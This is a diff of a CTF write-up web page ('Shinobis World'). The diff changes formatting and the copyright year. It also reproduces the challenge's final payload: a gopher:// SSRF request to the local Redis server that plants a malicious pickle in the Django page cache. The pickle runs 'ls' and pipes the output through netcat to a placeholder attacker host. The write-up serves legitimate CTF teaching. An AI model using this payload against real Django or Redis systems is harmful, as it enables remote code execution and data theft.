@@ -640,7 +640,7 @@
   <div class="article-container">
 
     <div class="article-style">
-      <h1 id="shinobis-world-1000pts-1-solves-"><strong>Shinobis World (1000pts) (1 Solves)</strong></h1>
+      <h1 id="shinobis-world-1000pts-1-solves"><strong>Shinobis World (1000pts) (1 Solves)</strong></h1>
 <p><img src="https://imgur.com/7X3dgtW.png" alt="TASK"></p>
 <p>Hello guys again , in this task we are give the Settings.py of a django Web application , we can notice that the website is using caching with redis that is listening on port 6379 locally !</p>
 <p><img src="https://imgur.com/60QSkz4.png" alt="TASK"></p>
@@ -673,7 +673,7 @@ so we can use 127.0.1 and maybe http or gopher protocol , firstly let&rsquo;s th
 </ul>
 <p>Final Payload :</p>
 <blockquote>
-<p>gopher://127.0.1:6379/aset%20:1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC%20&quot;cposix\nsystem\np0\n(S&rsquo;ls|nc YourVPSIP 1234&rsquo;\np1\ntp2\nRp3\n.&rdquo;
+<p>gopher://127.0.1:6379/aset%20:1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC%20&quot;cposix\nsystem\np0\n(S&rsquo;ls|nc YourVPSIP 1234'\np1\ntp2\nRp3\n.&quot;
 This Payload will execute ls command and send it to our vps (don&rsquo;t forget to refresh the Shinobis page because it&rsquo;s the page that is being cached)</p>
 </blockquote>
 <p><em><strong>Note:</strong></em> You can find the source code of this task in the source code repo of my github repo</p>
@@ -1017,7 +1017,7 @@ If you have any questions dont forget to contact me and if you liked this writeu
   
 
   <p class="powered-by">
-    © Ahmed Belkahla, 2020 &middot; 
+    © Ahmed Belkahla, 2021 &middot; 
 
     Powered by the
     <a href="https://sourcethemes.com/academic/" target="_blank" rel="noopener">Academic theme</a> for
